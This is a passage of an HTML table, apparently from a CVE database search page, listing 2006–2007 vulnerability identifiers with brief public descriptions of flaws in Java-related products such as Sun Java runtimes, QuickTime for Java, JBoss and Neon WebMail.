		<td valign="top">Sun Java System Application Server and Web Server 7.0 through 9.0 before 20070710 do not properly process XSLT stylesheets in XSLT transforms in XML signatures, which allows context-dependent attackers to execute an arbitrary Java method via a crafted stylesheet, a related issue to CVE-2007-3716.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-3700">CVE-2007-3700</a></td>
		<td valign="top">Sun Java System Access Manager (formerly Java System Identity Server) before 20070710, when the message debug level is configured in the com.iplanet.services.debug.level property in AMConfig.properties, logs cleartext login passwords, which allows local users to gain privileges by reading /var/opt/SUNWam/debug/amAuth.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-3698">CVE-2007-3698</a></td>
		<td valign="top">The Java Secure Socket Extension (JSSE) in Sun JDK and JRE 6 Update 1 and earlier, JDK and JRE 5.0 Updates 7 through 11, and SDK and JRE 1.4.2_11 through 1.4.2_14, when using JSSE for SSL/TLS support, allows remote attackers to cause a denial of service (CPU consumption) via certain SSL/TLS handshake requests.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-3655">CVE-2007-3655</a></td>
		<td valign="top">Stack-based buffer overflow in javaws.exe in Sun Java Web Start in JRE 5.0 Update 11 and earlier, and 6.0 Update 1 and earlier, allows remote attackers to execute arbitrary code via a long codebase attribute in a JNLP file.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-3504">CVE-2007-3504</a></td>
		<td valign="top">Directory traversal vulnerability in the PersistenceService in Sun Java Web Start in JDK and JRE 5.0 Update 11 and earlier, and Java Web Start in SDK and JRE 1.4.2_13 and earlier, for Windows allows remote attackers to perform unauthorized actions via an application that grants file overwrite privileges to itself.  NOTE: this can be leveraged to execute arbitrary code by overwriting a .java.policy file.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-3503">CVE-2007-3503</a></td>
		<td valign="top">The Javadoc tool in Sun JDK 6 and JDK 5.0 Update 11 can generate HTML documentation pages that contain cross-site scripting (XSS) vulnerabilities, which allows remote attackers to inject arbitrary web script or HTML via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-3496">CVE-2007-3496</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in SAP Web Dynpro Java (BC-WD-JAV) in SAP NetWeaver Nw04 SP15 through SP19 and Nw04s SP7 through SP11, aka SAP Java Technology Services 640 before SP20 and SAP Web Dynpro Runtime Core Components 700 before SP12, allows remote attackers to inject arbitrary web script or HTML via the User-Agent HTTP header.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-3225">CVE-2007-3225</a></td>
		<td valign="top">Unspecified vulnerability in Sun Java System Directory Server (slapd) 6.0, and 5.2 with Patch 3 or 4, allows remote attackers to modify certain data via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-3224">CVE-2007-3224</a></td>
		<td valign="top">Unspecified vulnerability in Sun ONE/Java System Directory Server (slapd) 6.0, and 5.x before 5.2 Patch 5, allows remote attackers to determine the existence of attributes of an entry via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-2906">CVE-2007-2906</a></td>
		<td valign="top">Java Embedding Plugin 0.9.6.1 allows remote attackers to cause a denial of service (browser crash) via a Thread subclass that calls super.run from its run method.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-2904">CVE-2007-2904</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in Sun Java System Messaging Server 6.0 through 6.3, when Internet Explorer is used, allows remote attackers to inject arbitrary web script or HTML via unspecified vectors, possibly a related issue to CVE-2006-5653.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-2881">CVE-2007-2881</a></td>
		<td valign="top">Multiple stack-based buffer overflows in the SOCKS proxy support (sockd) in Sun Java Web Proxy Server before 4.0.5 allow remote attackers to execute arbitrary code via crafted packets during protocol negotiation.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-2789">CVE-2007-2789</a></td>
		<td valign="top">The BMP image parser in Sun Java Development Kit (JDK) before 1.5.0_11-b03 and 1.6.x before 1.6.0_01-b06, and Sun Java Runtime Environment in JDK and JRE 6, JDK and JRE 5.0 Update 10 and earlier, SDK and JRE 1.4.2_14 and earlier, and SDK and JRE 1.3.1_19 and earlier, when running on Unix/Linux systems, allows remote attackers to cause a denial of service (JVM hang) via untrusted applets or applications that open arbitrary local files via a crafted BMP file, such as /dev/tty.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-2788">CVE-2007-2788</a></td>
		<td valign="top">Integer overflow in the embedded ICC profile image parser in Sun Java Development Kit (JDK) before 1.5.0_11-b03 and 1.6.x before 1.6.0_01-b06, and Sun Java Runtime Environment in JDK and JRE 6, JDK and JRE 5.0 Update 10 and earlier, SDK and JRE 1.4.2_14 and earlier, and SDK and JRE 1.3.1_20 and earlier, allows remote attackers to execute arbitrary code or cause a denial of service (JVM crash) via a crafted JPEG or BMP file that triggers a buffer overflow.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-2466">CVE-2007-2466</a></td>
		<td valign="top">Unspecified vulnerability in the LDAP Software Development Kit (SDK) for C, as used in Sun Java System Directory Server 5.2 up to Patch 4 and Sun ONE Directory Server 5.1, allows remote attackers to cause a denial of service (crash) via certain BER encodings.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-2435">CVE-2007-2435</a></td>
		<td valign="top">Sun Java Web Start in JDK and JRE 5.0 Update 10 and earlier, and Java Web Start in SDK and JRE 1.4.2_13 and earlier, allows remote attackers to perform unauthorized actions via an application that grants privileges to itself, related to "Incorrect Use of System Classes" and probably related to support for JNLP files.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-2408">CVE-2007-2408</a></td>
		<td valign="top">WebKit in Apple Safari 3 Beta before Update 3.0.3 does not properly recognize an unchecked "Enable Java" setting, which allows remote attackers to execute Java applets via a crafted web page.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-2402">CVE-2007-2402</a></td>
		<td valign="top">QuickTime for Java in Apple Quicktime before 7.2 does not perform sufficient "access control," which allows remote attackers to obtain sensitive information (screen content) via crafted Java applets.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-2397">CVE-2007-2397</a></td>
		<td valign="top">QuickTime for Java in Apple Quicktime before 7.2 does not properly check permissions, which allows remote attackers to disable security controls and execute arbitrary code via crafted Java applets.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-2396">CVE-2007-2396</a></td>
		<td valign="top">The JDirect support in QuickTime for Java in Apple Quicktime before 7.2 exposes certain dangerous interfaces, which allows remote attackers to execute arbitrary code via crafted Java applets.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-2393">CVE-2007-2393</a></td>
		<td valign="top">The design of QuickTime for Java in Apple Quicktime before 7.2 allows remote attackers to bypass certain security controls and write to process memory via Java applets, possibly leading to arbitrary code execution.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-2389">CVE-2007-2389</a></td>
		<td valign="top">Apple QuickTime for Java 7.1.6 on Mac OS X and Windows does not clear potentially sensitive memory before use, which allows remote attackers to read memory from a web browser via unknown vectors related to Java applets.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-2388">CVE-2007-2388</a></td>
		<td valign="top">Apple QuickTime for Java 7.1.6 on Mac OS X and Windows does not properly restrict QTObject subclassing, which allows remote attackers to execute arbitrary code via a web page containing a user-defined class that accesses unsafe functions that can be leveraged to write to arbitrary memory locations.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-2353">CVE-2007-2353</a></td>
		<td valign="top">Apache Axis 1.0 allows remote attackers to obtain sensitive information by requesting a non-existent WSDL file, which reveals the installation path in the resulting exception message.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-2175">CVE-2007-2175</a></td>
		<td valign="top">Apple QuickTime Java extensions (QTJava.dll), as used in Safari and other browsers, and when Java is enabled, allows remote attackers to execute arbitrary code via parameters to the toQTPointer method in quicktime.util.QTHandleRef, which can be used to modify arbitrary memory when creating QTPointerRef objects, as demonstrated during the "PWN 2 0WN" contest at CanSecWest 2007.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-2115">CVE-2007-2115</a></td>
		<td valign="top">Unspecified vulnerability in the Change Data Capture (CDC) component in Oracle Database 9.2.0.7, 10.1.0.5, and 10.2.0.2 has unknown impact and attack vectors, aka DB09.  NOTE: as of 20070424, oracle has not disputed reliable claims that this issue involves multiple SQL injection vulnerabilities in the DBMS_CDC_PUBLISH with remote authenticated vectors involving the "java classes in CDC.jar."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-1944">CVE-2007-1944</a></td>
		<td valign="top">The Java Message Service (JMS) in IBM WebSphere Application Server (WAS) before 6.1.0.7 allows attackers to cause a denial of service via unknown vectors involving the "double release [of] a bytebuffer input stream," possibly a double free vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-1681">CVE-2007-1681</a></td>
		<td valign="top">Format string vulnerability in libwebconsole_services.so in Sun Java Web Console 2.2.2 through 2.2.5 allows remote attackers to cause a denial of service (application crash), obtain sensitive information, and possibly execute arbitrary code via unspecified vectors during a failed login attempt, related to syslog.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-1526">CVE-2007-1526</a></td>
		<td valign="top">Sun Java System Web Server 6.1 before 20070314 allows remote authenticated users with revoked client certificates to bypass the Certificate Revocation List (CRL) authorization control and access secure web server instances running under an account different from that used for the admin server via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-1488">CVE-2007-1488</a></td>
		<td valign="top">Unspecified vulnerability in Sun Java System Web Server 6.0 and 6.1 before 20070315 allows remote attackers to "gain unauthorized access to data", possibly involving a sample application.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-1419">CVE-2007-1419</a></td>
		<td valign="top">The Java Management Extensions Remote API Remote Method Invocation over Internet Inter-ORB Protocol (JMX RMI-IIOP) API in Java Dynamic Management Kit 5.1 before 20070309 does not properly enforce the java.policy, which allows local users to obtain certain MBeans data access by operating a server application accessed by a privileged remote authenticated user.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-1332">CVE-2007-1332</a></td>
		<td valign="top">Multiple cross-site request forgery (CSRF) vulnerabilities in TKS Banking Solutions ePortfolio 1.0 Java allow remote attackers to perform unspecified restricted actions in the context of certain accounts by bypassing the client-side protection scheme.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-1331">CVE-2007-1331</a></td>
		<td valign="top">Multiple cross-site scripting (XSS) vulnerabilities in TKS Banking Solutions ePortfolio 1.0 Java allow remote attackers to inject arbitrary web script or HTML via unspecified vectors that bypass the client-side protection scheme, one of which may be the q parameter to the search program.  NOTE: some of these details are obtained from third party information.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-0628">CVE-2007-0628</a></td>
		<td valign="top">Multiple cross-site scripting (XSS) vulnerabilities in Sun Java System Access Manager 6.1, 6.2, 6 2005Q1 (6.3), and 7 2005Q4 (7.0) before 20070129 allow remote attackers to inject arbitrary web script or HTML via the (1) goto or (2) gx-charset parameter. NOTE: some of these details are obtained from third party information.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-0243">CVE-2007-0243</a></td>
		<td valign="top">Buffer overflow in Sun JDK and Java Runtime Environment (JRE) 5.0 Update 9 and earlier, SDK and JRE 1.4.2_12 and earlier, and SDK and JRE 1.3.1_18 and earlier allows applets to gain privileges via a GIF image with a block with a 0 width field, which triggers memory corruption.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-0114">CVE-2007-0114</a></td>
		<td valign="top">Sun Java System Content Delivery Server 5.0 and 5.0 PU1 allows remote attackers to obtain sensitive information regarding "content details" via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-0014">CVE-2007-0014</a></td>
		<td valign="top">ChainKey Java Code Protection allows attackers to decompile Java class files via a Java class loader with a modified defineClass method that saves the bytecode to a file before it is passed to the JVM.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-0009">CVE-2007-0009</a></td>
		<td valign="top">Stack-based buffer overflow in the SSLv2 support in Mozilla Network Security Services (NSS) before 3.11.5, as used by Firefox before 1.5.0.10 and 2.x before 2.0.0.2, Thunderbird before 1.5.0.10, SeaMonkey before 1.0.8, and certain Sun Java System server products before 20070611, allows remote attackers to execute arbitrary code via invalid "Client Master Key" length values.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-0008">CVE-2007-0008</a></td>
		<td valign="top">Integer underflow in the SSLv2 support in Mozilla Network Security Services (NSS) before 3.11.5, as used by Firefox before 1.5.0.10 and 2.x before 2.0.0.2, SeaMonkey before 1.0.8, Thunderbird before 1.5.0.10, and certain Sun Java System server products before 20070611, allows remote attackers to execute arbitrary code via a crafted SSLv2 server message containing a public key that is too short to encrypt the "Master Secret", which results in a heap-based overflow.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-6745">CVE-2006-6745</a></td>
		<td valign="top">Multiple unspecified vulnerabilities in Sun Java Development Kit (JDK) and Java Runtime Environment (JRE) 5.0 Update 7 and earlier, and Java System Development Kit (SDK) and JRE 1.4.2_12 and earlier 1.4.x versions, allow attackers to develop Java applets or applications that are able to gain privileges, related to serialization in JRE.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-6737">CVE-2006-6737</a></td>
		<td valign="top">Unspecified vulnerability in Sun Java Development Kit (JDK) and Java Runtime Environment (JRE) 5.0 Update 5 and earlier, Java System Development Kit (SDK) and JRE 1.4.2_10 and earlier 1.4.x versions, and SDK and JRE 1.3.1_18 and earlier allows attackers to use untrusted applets to "access data in other applets," aka "The first issue."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-6736">CVE-2006-6736</a></td>
		<td valign="top">Unspecified vulnerability in Sun Java Development Kit (JDK) and Java Runtime Environment (JRE) 5.0 Update 6 and earlier, Java System Development Kit (SDK) and JRE 1.4.2_12 and earlier 1.4.x versions, and SDK and JRE 1.3.1_18 and earlier allows attackers to use untrusted applets to "access data in other applets," aka "The second issue."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-6731">CVE-2006-6731</a></td>
		<td valign="top">Multiple buffer overflows in Sun Java Development Kit (JDK) and Java Runtime Environment (JRE) 5.0 Update 7 and earlier, Java System Development Kit (SDK) and JRE 1.4.2_12 and earlier 1.4.x versions, and SDK and JRE 1.3.1_18 and earlier allow attackers to develop Java applets that read, write, or execute local files, possibly related to (1) integer overflows in the Java_sun_awt_image_ImagingLib_convolveBI, awt_parseRaster, and awt_parseColorModel functions; (2) a stack overflow in the Java_sun_awt_image_ImagingLib_lookupByteRaster function; and (3) improper handling of certain negative values in the Java_sun_font_SunLayoutEngine_nativeLayout function.  NOTE: some of these details are obtained from third party information.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-6607">CVE-2006-6607</a></td>
		<td valign="top">The Java Key Store (JKS) for WebSphere Application Server (WAS) for IBM Tivoli Identity Manager (ITIM) 4.6 places the JKS password in a -Djavax.net.ssl.trustStorePassword command line argument, which allows local users to obtain the password by listing the process or using other methods.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-6276">CVE-2006-6276</a></td>
		<td valign="top">HTTP request smuggling vulnerability in Sun Java System Proxy Server before 20061130, when used with Sun Java System Application Server or Sun Java System Web Server, allows remote attackers to bypass HTTP request filtering, hijack web sessions, perform cross-site scripting (XSS), and poison web caches via unspecified attack vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-6009">CVE-2006-6009</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) Swing library in JDK and JRE 5.0 Update 7 and earlier allows attackers to obtain certain information via unknown attack vectors, related to an untrusted applet accessing data in other applets.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-5750">CVE-2006-5750</a></td>
		<td valign="top">Directory traversal vulnerability in the DeploymentFileRepository class in JBoss Application Server (jbossas) 3.2.4 through 4.0.5 allows remote authenticated users to read or modify arbitrary files, and possibly execute arbitrary code, via unspecified vectors related to the console manager.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-5681">CVE-2006-5681</a></td>
		<td valign="top">QuickTime for Java on Mac OS X 10.4 through 10.4.8, when used with Quartz Composer, allows remote attackers to obtain sensitive information (screen images) via a Java applet that accesses images that are being rendered by other embedded QuickTime objects.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-5654">CVE-2006-5654</a></td>
		<td valign="top">Unspecified vulnerability in the Network Security Services (NSS) in Sun Java System Web Server 6.0 before SP 10 and ONE Application Server 7 before Update 3, when SSLv2 is enabled, allows remote authenticated users to cause a denial of service (application crash) via unspecified vectors.  NOTE: due to lack of details from the vendor, it is unclear whether this is related to vector 1 in CVE-2006-5201 or CVE-2006-3127.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-5653">CVE-2006-5653</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in the errorHTML function in the index script in Sun Java System Messenger Express 6 allows remote attackers to inject arbitrary web script or HTML via the error parameter.  NOTE: this issue might be related to CVE-2006-5486, however due to the vagueness of the initial advisory and different researchers a new CVE was assigned.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-5486">CVE-2006-5486</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in Webmail in Sun Java System Messaging Server 6.0 through 6.2 and iPlanet Messaging Server 5.2 allows remote attackers to execute arbitrary Javascript via crafted messages.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-5201">CVE-2006-5201</a></td>
		<td valign="top">Multiple packages on Sun Solaris, including (1) NSS; (2) Java JDK and JRE 5.0 Update 8 and earlier, SDK and JRE 1.4.x up to 1.4.2_12, and SDK and JRE 1.3.x up to 1.3.1_19; (3) JSSE 1.0.3_03 and earlier; (4) IPSec/IKE; (5) Secure Global Desktop; and (6) StarOffice, when using an RSA key with exponent 3, removes PKCS-1 padding before generating a hash, which allows remote attackers to forge a PKCS #1 v1.5 signature that is signed by that RSA key and prevents these products from correctly verifying X.509 and other certificates that use PKCS #1.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-4956">CVE-2006-4956</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in the updateuser servlet in Neon WebMail for Java before 5.08 allows remote attackers to inject arbitrary web script or HTML via the in_name parameter, as used by the Name field.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-4955">CVE-2006-4955</a></td>
		<td valign="top">Directory traversal vulnerability in the downloadfile servlet in Neon WebMail for Java before 5.08 allows remote attackers to read arbitrary files via a .. (dot dot) sequence in the (1) savefolder and (2) savefilename parameters.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-4954">CVE-2006-4954</a></td>
		<td valign="top">The updateuser servlet in Neon WebMail for Java before 5.08 does not validate the in_id parameter, which allows remote attackers to modify information of arbitrary users, as demonstrated by modifying (1) passwords and (2) permissions, (3) viewing profile settings, and (4) creating and (5) deleting users.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-4953">CVE-2006-4953</a></td>
		<td valign="top">Multiple SQL injection vulnerabilities in Neon WebMail for Java before 5.08 allow remote attackers to execute arbitrary SQL commands via the (1) adr_sortkey and (2) adr_sortkey_desc parameters in the (a) addrlist servlet, and the (3) sortkey and (4) sortkey_desc parameters in the (b) maillist servlet.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-4952">CVE-2006-4952</a></td>
		<td valign="top">The updatemail servlet in Neon WebMail for Java before 5.08 allows remote attackers to move e-mail messages of arbitrary users between different mail folders, specified by the folderid and tofolderid parameters, via the ID parameter.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-4951">CVE-2006-4951</a></td>
		<td valign="top">Neon WebMail for Java before 5.08 allows remote attackers to execute arbitrary Java (JSP) code by sending an e-mail message with a JSP file attachment, which is stored under the web root with a predictable filename.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-4706">CVE-2006-4706</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in inc/functions_post.php in MyBB (aka MyBulletinBoard) 1.1.7 allows remote attackers to inject arbitrary web script or HTML via a url BBCode tag that contains a javascript URI with an SGML numeric character reference and an embedded space, as demonstrated using "java&amp; #115;cript," a different vulnerability than CVE-2006-3761.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-4353">CVE-2006-4353</a></td>
		<td valign="top">Unspecified vulnerability in Sun Java System Content Delivery Server 4.0, 4.1, and 5.0 allows local and remote attackers to read data from arbitrary files via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-4302">CVE-2006-4302</a></td>
		<td valign="top">The Java Plug-in J2SE 1.3.0_02 through 5.0 Update 5, and Java Web Start 1.0 through 1.2 and J2SE 1.4.2 through 5.0 Update 5, allows remote attackers to exploit vulnerabilities by specifying a JRE version that contain vulnerabilities.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-4175">CVE-2006-4175</a></td>
		<td valign="top">The LDAP server (ns-slapd) in Sun Java System Directory Server 5.2 Patch4 and earlier and ONE Directory Server 5.1 and 5.2 allows remote attackers to cause a denial of service (crash) via malformed queries, probably malformed BER queries, which trigger a free of uninitialized memory locations.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-3921">CVE-2006-3921</a></td>
		<td valign="top">Sun Java System Application Server (SJSAS) 7 through 8.1 and Web Server (SJSWS) 6.0 and 6.1 allows remote authenticated users to read files outside of the "document root directory" via a direct request using a UTF-8 encoded URI.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-3761">CVE-2006-3761</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in inc/functions_post.php in MyBB (aka MyBulletinBoard) 1.0 RC2 through 1.1.4 allows remote attackers to inject arbitrary web script or HTML via a javascript URI with an SGML numeric character reference in the url BBCode tag, as demonstrated using "java&amp;#115;cript".

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-3733">CVE-2006-3733</a></td>
		<td valign="top">jmx-console/HtmlAdaptor in the jmx-console in the JBoss web application server, as shipped with Cisco Security Monitoring, Analysis and Response System (CS-MARS) before 4.2.1, allows remote attackers to gain privileges as the CS-MARS administrator and execute arbitrary Java code via an invokeOp action in the BSHDeployer jboss.scripts service name.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-3677">CVE-2006-3677</a></td>
		<td valign="top">Mozilla Firefox 1.5 before 1.5.0.5 and SeaMonkey before 1.0.3 allows remote attackers to execute arbitrary code by changing certain properties of the window navigator object (window.navigator) that are accessed when Java starts up, which causes a crash that leads to code execution.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-3423">CVE-2006-3423</a></td>
		<td valign="top">WebEx Downloader ActiveX Control and WebEx Downloader Java before 2.1.0.0 do not validate downloaded components, which allows remote attackers to execute arbitrary code via a website that activates the GpcUrlRoot and GpcIniFileName ActiveX controls to cause the client to download a DLL file.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-3230">CVE-2006-3230</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in index.tmpl in Azureus Tracker 2.4.0.2 and earlier (Java BitTorrent Client Tracker) allows remote attackers to inject arbitrary web script or HTML via the search parameter.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-3225">CVE-2006-3225</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in Sun ONE Application Server 7 before Update 9, Java System Application Server 7 2004Q2 before Update 5, and Java System Application Server Enterprise Edition 8.1 2005 Q1 allows remote attackers to inject arbitrary HTML or web script via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-3127">CVE-2006-3127</a></td>
		<td valign="top">Memory leak in Network Security Services (NSS) 3.11, as used in Sun Java Enterprise System 2003Q4 through 2005Q1 and Java System Directory Server 5.2, allows remote attackers to cause a denial of service (memory consumption) by performing a large number of RSA cryptographic operations.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-3072">CVE-2006-3072</a></td>
		<td valign="top">M4 Macro Library in Symantec Security Information Manager before 4.0.2.29 HOTFIX 1 allows local users to execute arbitrary commands via crafted "rule definitions", which produces dangerous Java code during M4 transformation.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-2806">CVE-2006-2806</a></td>
		<td valign="top">The SMTP server in Apache Java Mail Enterprise Server (aka Apache James) 2.2.0 allows remote attackers to cause a denial of service (CPU consumption) via a long argument to the MAIL command.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-2513">CVE-2006-2513</a></td>
		<td valign="top">Unspecified vulnerability in the installation process in Sun Java System Directory Server 5.2 causes wrong user data to be written to a file created by the installation, which allows remote attackers or local users to gain privileges.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-2501">CVE-2006-2501</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in Sun ONE Web Server 6.0 SP9 and earlier, Java System Web Server 6.1 SP4 and earlier, Sun ONE Application Server 7 Platform and Standard Edition Update 6 and earlier, and Java System Application Server 7 2004Q2 Standard and Enterprise Edition Update 2 and earlier, allows remote attackers to inject arbitrary web script or HTML via unknown attack vectors, possibly involving error messages.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-2426">CVE-2006-2426</a></td>
